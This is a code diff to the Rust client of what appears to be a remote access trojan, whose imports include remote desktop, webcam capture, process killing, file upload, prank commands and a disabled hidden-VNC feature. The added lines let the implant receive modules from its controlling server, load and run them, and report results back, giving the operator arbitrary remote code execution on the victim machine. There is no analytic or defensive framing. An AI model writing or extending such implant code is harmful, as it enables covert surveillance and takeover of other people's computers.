@@ -4,6 +4,7 @@ use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, sto
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::fun::execute_troll_command;
 use crate::features::webcam::take_webcam;
+use crate::features::module_loader;
 // use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
 use rand_chacha::ChaCha20Rng;
@@ -125,6 +126,30 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::UploadFile(target_folder, file_data))) => file_manager.upload_file(target_folder, file_data).await,
 
             Ok(Some(ClientboundPacket::TrollClient(command))) => execute_troll_command(&command),
+
+            Ok(Some(ClientboundPacket::LoadModule(module_data))) => {
+                match module_loader::load_module(module_data) {
+                    Ok(_) => println!("Module loaded successfully"),
+                    Err(e) => println!("Failed to load module: {}", e),
+                }
+            }
+
+            Ok(Some(ClientboundPacket::ExecuteModule(execution))) => {
+                let result = module_loader::execute_module(execution).await;
+                let _ = send_packet(ServerboundPacket::ModuleExecutionResult(result)).await;
+            }
+
+            Ok(Some(ClientboundPacket::UnloadModule(module_id))) => {
+                match module_loader::unload_module(&module_id) {
+                    Ok(_) => println!("Module unloaded: {}", module_id),
+                    Err(e) => println!("Failed to unload module: {}", e),
+                }
+            }
+
+            Ok(Some(ClientboundPacket::ListModules)) => {
+                let modules = module_loader::list_modules();
+                println!("Loaded modules: {:?}", modules);
+            }
 
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
